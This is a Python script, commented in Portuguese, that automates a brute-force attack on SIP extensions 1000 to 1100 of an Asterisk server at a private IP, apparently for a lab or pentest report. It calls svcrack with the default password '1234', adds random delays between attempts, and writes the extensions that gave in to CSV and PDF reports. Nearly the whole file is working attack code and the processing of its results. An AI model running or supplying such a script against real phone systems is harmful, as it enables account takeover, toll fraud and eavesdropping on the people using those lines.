import subprocess
import os
import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.backends.backend_pdf import PdfPages
import time
import random

def run():
    print("[+] Iniciando ataque de força bruta com SIPVicious (svcrack)...")

    asterisk_ip = "192.168.0.75"
    porta_sip = 5060
    wordlist_path = "wordlist.txt"
    resultados = []

    # Cria wordlist com a senha padrão
    if not os.path.exists(wordlist_path):
        with open(wordlist_path, "w") as f:
            f.write("1234\n")

    os.makedirs("results", exist_ok=True)

    for ramal in range(1000, 1101):
        print(f"[+] Testando ramal {ramal}...")

        cmd = [
            "svcrack",
            "-u", str(ramal),
            "-d", wordlist_path,
            f"udp://{asterisk_ip}:{porta_sip}"
        ]

        try:
            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            output = proc.stdout + proc.stderr

            if "1234" in output and str(ramal) in output:
                resultados.append({"Ramal": ramal, "Senha": "1234", "Status": "Sucesso"})
            elif "unknown response" in output.lower() or "We got an unknown response" in output:
                resultados.append({"Ramal": ramal, "Senha": "-", "Status": "Erro de resposta"})
            else:
                resultados.append({"Ramal": ramal, "Senha": "-", "Status": "Falha"})
        except subprocess.TimeoutExpired:
            resultados.append({"Ramal": ramal, "Senha": "-", "Status": "Timeout"})

        time.sleep(random.uniform(0.3, 1.2))  # Delay entre tentativas

    # Salva CSV
    df = pd.DataFrame(resultados)
    df.to_csv("results/forca_bruta_resultados.csv", index=False)

    # Gera gráfico
    contagem = df["Status"].value_counts()
    plt.figure(figsize=(6, 4))
    contagem.plot(kind="bar", color=["green", "red", "gray", "orange"])
    plt.title("Resumo dos Resultados de Força Bruta")
    plt.xlabel("Status")
    plt.ylabel("Quantidade")
    plt.tight_layout()

    # PDF com tabela e gráfico
    with PdfPages("results/forca_bruta_resultados.pdf") as pdf:
        # Página 1: Tabela
        fig, ax = plt.subplots(figsize=(8.27, 11.69))  # A4
        ax.axis('off')
        ax.set_title("Resultados de Ataque de Força Bruta", fontsize=16)
        table = ax.table(cellText=df.values, colLabels=df.columns, loc='center', cellLoc='center')
        table.auto_set_font_size(False)
        table.set_fontsize(10)
        table.scale(1.2, 1.2)
        pdf.savefig(fig)
        plt.close()

        # Página 2: Gráfico
        plt.figure(figsize=(8.27, 11.69))
        contagem.plot(kind="bar", color=["green", "red", "gray", "orange"])
        plt.title("Resumo dos Resultados de Força Bruta")
        plt.xlabel("Status")
        plt.ylabel("Quantidade")
        plt.tight_layout()
        pdf.savefig()
        plt.close()

    print("[+] Arquivo CSV salvo em: results/forca_bruta_resultados.csv")
    print("[+] Arquivo PDF salvo em: results/forca_bruta_resultados.pdf")
